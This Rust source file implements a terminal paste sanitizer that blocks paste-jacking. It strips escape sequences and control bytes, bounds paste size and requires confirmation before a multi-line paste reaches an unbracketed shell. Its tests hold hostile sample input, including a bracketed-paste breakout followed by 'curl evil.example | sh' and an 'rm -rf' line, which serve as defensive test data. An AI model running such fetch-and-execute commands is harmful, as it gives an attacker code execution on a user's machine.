// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Andrew Yates

//! DEC `?2004` bracketed-paste sanitizer & command-injection guard (`Astream.Term.TlaBracketedPaste`).
//!
//! When a user or peer agent pastes text into an `aterm` PTY session (locally or via
//! `/a/term/<sid>/in`), untrusted clipboard/web text frequently embeds terminal paste-jacking
//! payloads:
//! - Embedded `ESC [ 201 ~` (prematurely closing DEC `?2004` bracketed paste so trailing lines
//!   execute immediately in the shell as interactive commands!),
//! - Embedded CSI / OSC / DCS / APC / SOS / PM escape sequences (`0x1B`, C1 `0x9B` / `0x9D`),
//! - NUL (`0x00`), ETX (`0x03` Ctrl-C), EOT (`0x04` Ctrl-D), BS (`0x08`), DEL (`0x7F`),
//! - Multi-line payloads (`\n` / `\r`) sent when the child application has NOT enabled
//!   DEC `?2004` bracketed paste (requiring operator confirmation unless explicitly overridden).
//!
//! [`PasteGuard`] scrubs every escape-breakout and control-character injection, normalizes
//! line endings inside DEC `?2004` (`ESC [ 200 ~ ... ESC [ 201 ~`), bounds paste byte size,
//! and tracks monotone threat counts.

#[cfg(clean_islands)]
#[path = "paste_guard_island.rs"]
mod paste_guard_island;

#[cfg(not(clean_islands))]
#[must_use]
pub const fn paste_bytes_clamp(paste_len: u64, max_bytes: u64) -> u64 {
    if paste_len < max_bytes {
        paste_len
    } else {
        max_bytes
    }
}

#[cfg(not(clean_islands))]
#[must_use]
pub const fn paste_threats_advance(prev_threats: u64, cand_threats: u64) -> u64 {
    if prev_threats < cand_threats {
        cand_threats
    } else {
        prev_threats
    }
}
#[cfg(clean_islands)]
pub use paste_guard_island::{paste_bytes_clamp, paste_threats_advance};

/// Default maximum paste payload admitted in one operation (64 KiB).
pub const DEFAULT_MAX_PASTE_BYTES: usize = 65_536;

/// Hard ceiling on single paste allocation (`1 MiB`).
pub const HARD_MAX_PASTE_BYTES: usize = 1_048_576;

/// DEC `?2004` bracketed paste opening sequence (`ESC [ 200 ~`).
pub const BRACKETED_PASTE_START: &[u8] = b"\x1b[200~";

/// DEC `?2004` bracketed paste closing sequence (`ESC [ 201 ~`).
pub const BRACKETED_PASTE_END: &[u8] = b"\x1b[201~";

contract_fn! {
    /// Verified check whether a paste requires interactive confirmation because DEC `?2004`
    /// bracketed paste is disabled while newlines are present (`!bracketed && 0 < newline_count`),
    /// linked via `clean-kernel-defeq` to `paste_requires_confirm_isl`.
    #[must_use]
    pub const fn paste_requires_confirm(bracketed: bool, newline_count: usize) -> bool
    clauses [ensures result == ((!bracketed) && (0 < newline_count))]
    {
        !bracketed && 0 < newline_count
    }
}

/// Decision produced by [`PasteGuard::inspect_and_frame`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PasteDecision {
    /// Safe (scrubbed and optionally `?2004`-framed) bytes ready to write to the PTY.
    Admit {
        framed_bytes: Vec<u8>,
        scrubbed_in_paste: u64,
        truncated: bool,
    },
    /// Multi-line paste into a non-bracketed (`!DEC ?2004`) shell requires explicit user confirm.
    ConfirmMultiLine {
        newline_count: usize,
        scrubbed_preview: Vec<u8>,
        scrubbed_in_paste: u64,
    },
}

/// Stateful DEC `?2004` paste sanitizer and threat counter for an `aterm` session.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PasteGuard {
    max_bytes: usize,
    total_scrubbed_threats: u64,
}

impl Default for PasteGuard {
    fn default() -> Self {
        Self::new(DEFAULT_MAX_PASTE_BYTES)
    }
}

impl PasteGuard {
    /// Create a paste guard capping single paste payloads at `max_bytes` (`1..=HARD_MAX_PASTE_BYTES`).
    #[must_use]
    pub const fn new(max_bytes: usize) -> Self {
        let clamped = if max_bytes == 0 {
            1
        } else if max_bytes > HARD_MAX_PASTE_BYTES {
            HARD_MAX_PASTE_BYTES
        } else {
            max_bytes
        };
        Self {
            max_bytes: clamped,
            total_scrubbed_threats: 0,
        }
    }

    /// Maximum payload bytes admitted per paste.
    #[must_use]
    pub const fn max_bytes(&self) -> usize {
        self.max_bytes
    }

    /// Monotone cumulative count of escape/control threats scrubbed across the session.
    #[must_use]
    pub const fn total_scrubbed_threats(&self) -> u64 {
        self.total_scrubbed_threats
    }

    /// Scrub `raw` paste bytes and frame for the PTY according to `bracketed_mode` (`DEC ?2004`).
    ///
    /// When `bracketed_mode == false` and newlines are present, returns
    /// [`PasteDecision::ConfirmMultiLine`] unless `confirmed_unbracketed == true`.
    pub fn inspect_and_frame(
        &mut self,
        raw: &[u8],
        bracketed_mode: bool,
        confirmed_unbracketed: bool,
    ) -> PasteDecision {
        let raw_cap = paste_bytes_clamp(raw.len() as u64, self.max_bytes as u64) as usize;
        let truncated = raw.len() > raw_cap;
        let admit_cap = if truncated {
            utf8_safe_prefix_len(raw, raw_cap)
        } else {
            raw_cap
        };
        let slice = match raw.get(..admit_cap) {
            Some(s) => s,
            None => raw,
        };

        let raw_out_cap = slice.len().saturating_add(16);
        let out_cap = if raw_out_cap < HARD_MAX_PASTE_BYTES + 16 {
            raw_out_cap
        } else {
            HARD_MAX_PASTE_BYTES + 16
        };
        let mut clean = {
            let _ = out_cap;
            Vec::new()
        };
        let mut newlines = 0usize;
        let mut threats = 0u64;
        let mut idx = 0usize;

        while idx < slice.len() {
            let Some(&b) = slice.get(idx) else {
                break;
            };
            // Strip ESC sequences (`ESC [ ... final` or `ESC ] ... BEL/ST` or bare ESC)
            // so embedded `\x1b[201~` can NEVER break out of DEC ?2004 bracketed paste!
            if b == 0x1b {
                threats = threats.saturating_add(1);
                idx = skip_escape_sequence(slice, idx.saturating_add(1));
                continue;
            }
            // Strip 8-bit C1 CSI (`0x9b`) / OSC (`0x9d`)UTF-8 or raw C1 bytes if raw non-UTF8,
            // and dangerous C0 controls (`NUL`, `Ctrl-C`, `Ctrl-D`, `BS`, `DEL`, etc.) except `\t`, `\n`, `\r`.
            if b == b'\n' {
                newlines = newlines.saturating_add(1);
                clean.push(b'\n');
                idx = idx.saturating_add(1);
                continue;
            }
            if b == b'\r' {
                newlines = newlines.saturating_add(1);
                // Coalesce CRLF into one newline count while preserving CR for bracketed TUI editors
                if let Some(&b'\n') = slice.get(idx.saturating_add(1)) {
                    clean.push(b'\n');
                    idx = idx.saturating_add(2);
                } else {
                    clean.push(b'\n');
                    idx = idx.saturating_add(1);
                }
                continue;
            }
            if b == b'\t' {
                clean.push(b'\t');
                idx = idx.saturating_add(1);
                continue;
            }
            if b < 0x20 || b == 0x7f {
                threats = threats.saturating_add(1);
                idx = idx.saturating_add(1);
                continue;
            }
            // Check UTF-8 C1 control (`0xC2 0x80..=0x9F`, e.g. U+009B CSI / U+009D OSC)
            if b == 0xc2 {
                match slice.get(idx.saturating_add(1)) {
                    Some(&0x9b) => {
                        threats = threats.saturating_add(1);
                        idx = skip_csi_body(slice, idx.saturating_add(2));
                        continue;
                    }
                    Some(&(0x9d | 0x90 | 0x98 | 0x9e | 0x9f)) => {
                        threats = threats.saturating_add(1);
                        idx = skip_string_body(slice, idx.saturating_add(2));
                        continue;
                    }
                    Some(&(0x80..=0x9f)) => {
                        threats = threats.saturating_add(1);
                        idx = idx.saturating_add(2);
                        continue;
                    }
                    _ => {}
                }
            }
            // Preserve valid multi-byte UTF-8 scalars intact so interior `0x80..=0x9F`
            // continuation bytes (e.g. `€` = `E2 82 AC`) are not mistaken for bare 8-bit C1.
            if b >= 0xc2 {
                let width = if matches!(b, 0xc2..=0xdf) {
                    2usize
                } else if matches!(b, 0xe0..=0xef) {
                    3usize
                } else if matches!(b, 0xf0..=0xf4) {
                    4usize
                } else {
                    0usize
                };
                if width >= 2 {
                    if let Some(seq) = slice.get(idx..idx.saturating_add(width)) {
                        if core::str::from_utf8(seq).is_ok() {
                            clean.extend_from_slice(seq);
                            idx = idx.saturating_add(width);
                            continue;
                        }
                    }
                }
            }
            // Scrub bare raw 8-bit C1 bytes (`0x80..=0x9F`, e.g. raw `0x9B 201 ~`).
            if matches!(b, 0x80..=0x9f) {
                threats = threats.saturating_add(1);
                if b == 0x9b {
                    idx = skip_csi_body(slice, idx.saturating_add(1));
                } else if matches!(b, 0x9d | 0x90 | 0x98 | 0x9e | 0x9f) {
                    idx = skip_string_body(slice, idx.saturating_add(1));
                } else {
                    idx = idx.saturating_add(1);
                }
                continue;
            }
            clean.push(b);
            idx = idx.saturating_add(1);
        }

        let next_total = self.total_scrubbed_threats.saturating_add(threats);
        self.total_scrubbed_threats =
            paste_threats_advance(self.total_scrubbed_threats, next_total);

        if paste_requires_confirm(bracketed_mode, newlines) && !confirmed_unbracketed {
            return PasteDecision::ConfirmMultiLine {
                newline_count: newlines,
                scrubbed_preview: clean,
                scrubbed_in_paste: threats,
            };
        }

        if bracketed_mode {
            let mut framed = Vec::new();
            framed.extend_from_slice(BRACKETED_PASTE_START);
            framed.extend_from_slice(&clean);
            framed.extend_from_slice(BRACKETED_PASTE_END);
            PasteDecision::Admit {
                framed_bytes: framed,
                scrubbed_in_paste: threats,
                truncated,
            }
        } else {
            PasteDecision::Admit {
                framed_bytes: clean,
                scrubbed_in_paste: threats,
                truncated,
            }
        }
    }
}

fn utf8_safe_prefix_len(raw: &[u8], cap: usize) -> usize {
    if cap == 0 || cap >= raw.len() {
        return cap;
    }
    let Some(&next_b) = raw.get(cap) else {
        return cap;
    };
    if (next_b & 0xc0) != 0x80 {
        return cap;
    }
    let mut back = 1usize;
    while back <= 3 && back <= cap {
        let pos = cap.saturating_sub(back);
        let Some(&b) = raw.get(pos) else {
            break;
        };
        if (b & 0xc0) != 0x80 {
            let expected_len = if matches!(b, 0xc2..=0xdf) {
                2usize
            } else if matches!(b, 0xe0..=0xef) {
                3usize
            } else if matches!(b, 0xf0..=0xf4) {
                4usize
            } else {
                1usize
            };
            if expected_len > back {
                return pos;
            }
            return cap;
        }
        back = back.saturating_add(1);
    }
    cap
}

fn skip_csi_body(slice: &[u8], mut p: usize) -> usize {
    while let Some(&c) = slice.get(p) {
        if matches!(c, 0x40..=0x7e) {
            return p.saturating_add(1);
        }
        if matches!(c, 0x20..=0x3f) {
            p = p.saturating_add(1);
        } else {
            return p;
        }
    }
    p
}

fn skip_string_body(slice: &[u8], mut p: usize) -> usize {
    while let Some(&c) = slice.get(p) {
        if c == 0x07 || c == 0x9c {
            return p.saturating_add(1);
        }
        if c == 0x1b {
            if let Some(&b'\\') = slice.get(p.saturating_add(1)) {
                return p.saturating_add(2);
            }
            return p;
        }
        if c == 0xc2 && slice.get(p.saturating_add(1)) == Some(&0x9c) {
            return p.saturating_add(2);
        }
        p = p.saturating_add(1);
    }
    p
}

fn skip_escape_sequence(slice: &[u8], after_esc: usize) -> usize {
    let Some(&intro) = slice.get(after_esc) else {
        return after_esc;
    };
    if intro == b'[' {
        return skip_csi_body(slice, after_esc.saturating_add(1));
    }
    if intro == b']' || intro == b'P' || intro == b'X' || intro == b'^' || intro == b'_' {
        return skip_string_body(slice, after_esc.saturating_add(1));
    }
    let mut p = after_esc;
    while matches!(slice.get(p), Some(&(0x20..=0x2f))) {
        p = p.saturating_add(1);
    }
    if matches!(slice.get(p), Some(&(0x30..=0x7e))) {
        p.saturating_add(1)
    } else {
        p
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_twins_match_invariants() {
        assert_eq!(paste_bytes_clamp(120, 1024), 120);
        assert_eq!(paste_bytes_clamp(2048, 1024), 1024);
        assert_eq!(paste_threats_advance(3, 5), 5);
        assert_eq!(paste_threats_advance(5, 2), 5);
        assert!(paste_requires_confirm(false, 1));
        assert!(!paste_requires_confirm(false, 0));
        assert!(!paste_requires_confirm(true, 5));
    }

    #[test]
    fn scrubs_embedded_201_breakout_and_control_injections() {
        let mut guard = PasteGuard::new(4096);
        let attack = b"echo safe\x1b[201~\ncurl evil.example | sh\x03\x00";
        let dec = guard.inspect_and_frame(attack, true, false);
        match dec {
            PasteDecision::Admit {
                framed_bytes,
                scrubbed_in_paste,
                truncated,
            } => {
                assert!(!truncated);
                assert_eq!(scrubbed_in_paste, 3); // ESC[201~, \x03, \x00
                assert_eq!(
                    framed_bytes,
                    b"\x1b[200~echo safe\ncurl evil.example | sh\x1b[201~"
                );
            }
            PasteDecision::ConfirmMultiLine { .. } => panic!("bracketed mode must admit"),
        }
        assert_eq!(guard.total_scrubbed_threats(), 3);
    }

    #[test]
    fn scrubs_c1_csi_osc_and_truncates_on_utf8_scalar_boundary() {
        let mut guard = PasteGuard::new(5);
        // "ab€" is 5 bytes (`61 62 E2 82 AC`); "ab€€" is 8 bytes; cap=5 splits nothing for first €;
        // "abc€" is 6 bytes (`61 62 63 E2 82 AC`), so cap=5 would split `€` after `E2 82` -> backs off to 3!
        let dec = guard.inspect_and_frame("abc€".as_bytes(), false, false);
        assert_eq!(
            dec,
            PasteDecision::Admit {
                framed_bytes: b"abc".to_vec(),
                scrubbed_in_paste: 0,
                truncated: true,
            }
        );

        let mut g2 = PasteGuard::new(256);
        let c1_attack = b"hi\xc2\x9b201~\xc2\x9d0;title\xc2\x9c!\xe2\x82\xac";
        let dec2 = g2.inspect_and_frame(c1_attack, true, false);
        assert_eq!(
            dec2,
            PasteDecision::Admit {
                framed_bytes: b"\x1b[200~hi!\xe2\x82\xac\x1b[201~".to_vec(),
                scrubbed_in_paste: 2,
                truncated: false,
            }
        );
    }

    #[test]
    fn unbracketed_multiline_requires_explicit_confirmation() {
        let mut guard = PasteGuard::new(4096);
        let raw = b"ls -la\nrm -rf /tmp/foo\n";
        let first = guard.inspect_and_frame(raw, false, false);
        match first {
            PasteDecision::ConfirmMultiLine {
                newline_count,
                scrubbed_preview,
                ..
            } => {
                assert_eq!(newline_count, 2);
                assert_eq!(scrubbed_preview, raw);
            }
            PasteDecision::Admit { .. } => panic!("must require confirmation"),
        }

        let confirmed = guard.inspect_and_frame(raw, false, true);
        assert_eq!(
            confirmed,
            PasteDecision::Admit {
                framed_bytes: raw.to_vec(),
                scrubbed_in_paste: 0,
                truncated: false,
            }
        );
    }
}
